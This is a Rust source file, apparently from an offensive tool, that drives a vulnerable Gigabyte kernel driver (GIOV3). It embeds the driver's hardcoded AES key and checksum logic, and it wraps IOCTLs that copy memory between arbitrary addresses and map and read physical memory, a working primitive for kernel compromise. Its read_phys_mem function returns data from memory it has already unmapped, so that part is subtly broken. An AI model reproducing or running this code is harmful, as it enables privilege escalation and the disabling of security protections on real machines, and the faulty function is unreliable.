use crate::util::{PhysicalAddres, VirtualAddress};

use windows::core::*;
use windows::Win32::Foundation::*;
use windows::Win32::Storage::FileSystem::{
    CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_MODE,
    OPEN_EXISTING,
};
use windows::Win32::System::IO::DeviceIoControl;

use aes::cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit};

static AES_KEY: &[u8; 16] = b"GIGABYTEPASSWORD";
static IV: &[u8; 16] = &[0x0; 16];

type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;

pub struct GigabyteDriver {
    device_handle: HANDLE,
}

impl GigabyteDriver {
    pub fn new() -> Result<Self> {
        let device_handle = unsafe {
            CreateFileA(PCSTR(b"\\\\.\\GIOV3\0".as_ptr()),
                        FILE_GENERIC_READ | FILE_GENERIC_WRITE,
                        FILE_SHARE_MODE(0),
                        std::ptr::null() as _,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        HANDLE(0))?
        };

        Ok(Self { device_handle })
    }

    pub fn device_io_control(&self,
                             ioctl_code: u32,
                             input_buffer: &[u8],
                             output_buffer: &mut [u8])
                             -> BOOL {
        unsafe {
            let mut bytes_returned = 0;
            DeviceIoControl(self.device_handle,
                            ioctl_code,
                            input_buffer.as_ptr() as _,
                            input_buffer.len() as u32,
                            output_buffer.as_mut_ptr() as _,
                            output_buffer.len() as u32,
                            &mut bytes_returned,
                            std::ptr::null_mut())
        }
    }

    pub fn ioctl_memcpy(&self, src: u64, dest: u64, size: u32) -> BOOL {
        let mut input_buffer_aes: Vec<u8> = Vec::new();

        input_buffer_aes.extend_from_slice(&dest.to_le_bytes());
        input_buffer_aes.extend_from_slice(&src.to_le_bytes());
        input_buffer_aes.extend_from_slice(&size.to_le_bytes());

        let mut encrypted_buffer = aes_encrypt(&mut input_buffer_aes);
        encrypted_buffer.extend_from_slice(IV);
        encrypted_buffer.extend_from_slice(&[0, 0, 0u8]);
        compute_checksum(&mut encrypted_buffer);

        assert_eq!(encrypted_buffer.len(), 0x34);

        let mut output_buffer = [0; 0];

        self.device_io_control(0xC3502808, &encrypted_buffer, &mut output_buffer)
    }

    pub fn ioctl_map_physmem(&self,
                             section_offset: PhysicalAddres,
                             view_size: u64)
                             -> VirtualAddress {
        let mut input_buffer: Vec<u8> = Vec::new();
        input_buffer.extend_from_slice(&section_offset.to_le_bytes());
        input_buffer.extend_from_slice(&view_size.to_le_bytes());

        let mut output_buffer = [0u8; 0x10];

        self.device_io_control(0xC350200C, &input_buffer, &mut output_buffer);
        let virtual_address = u64::from_le_bytes(output_buffer[0..8].try_into().unwrap());

        virtual_address
    }

    pub fn ioctl_unmap_physmem(&self, section_view: VirtualAddress) {
        let mut input_buffer: Vec<u8> = Vec::new();
        input_buffer.extend_from_slice(&section_view.to_le_bytes());

        let mut output_buffer = [0u8; 0];

        self.device_io_control(0xC3502010, &input_buffer, &mut output_buffer);
    }

    pub fn read_phys_mem_qword(&self, physical_address: PhysicalAddres) -> u64 {
        let physical_address_page = physical_address & (0xffff_ffff_ffff_f000);
        let physical_address_page_offset = (physical_address & 0xfff) as usize;
        let phys_mem_section = self.ioctl_map_physmem(physical_address_page, 4096);
        let phys_mem = unsafe { std::slice::from_raw_parts(phys_mem_section as *const u8, 4096) };
        let qword_bytes = &phys_mem[physical_address_page_offset..physical_address_page_offset + 8];

        let qword = u64::from_le_bytes(qword_bytes.try_into().unwrap());

        self.ioctl_unmap_physmem(phys_mem_section);

        qword
    }

    pub fn read_phys_mem(&self, physical_address: PhysicalAddres, size: usize) -> &[u8] {
        let physical_address_page = physical_address & (0xffff_ffff_ffff_f000);
        let physical_address_page_offset = (physical_address & 0xfff) as usize;
        let phys_mem_section = self.ioctl_map_physmem(physical_address_page, size as u64);

        let phys_mem = unsafe { std::slice::from_raw_parts(phys_mem_section as *const u8, size) };
        let buffer =
            (&phys_mem[physical_address_page_offset..physical_address_page_offset + size]).clone();

        self.ioctl_unmap_physmem(phys_mem_section);

        buffer
    }
}

/// Compute the checksum that the gigabyte driver checks for when issuing an IOCTL.
fn compute_checksum(input_buffer: &mut Vec<u8>) {
    let mut checksum = 0u8;
    for byte in input_buffer.iter() {
        checksum = checksum.wrapping_add(*byte);
    }
    input_buffer.push(!checksum);
}

/// Encrypt the IOCTL with AES_CBC as the driver expects.
fn aes_encrypt(input_buffer: &mut [u8]) -> Vec<u8> {
    Aes128CbcEnc::new(AES_KEY.into(), IV.into()).encrypt_padded_vec_mut::<Pkcs7>(input_buffer)
}
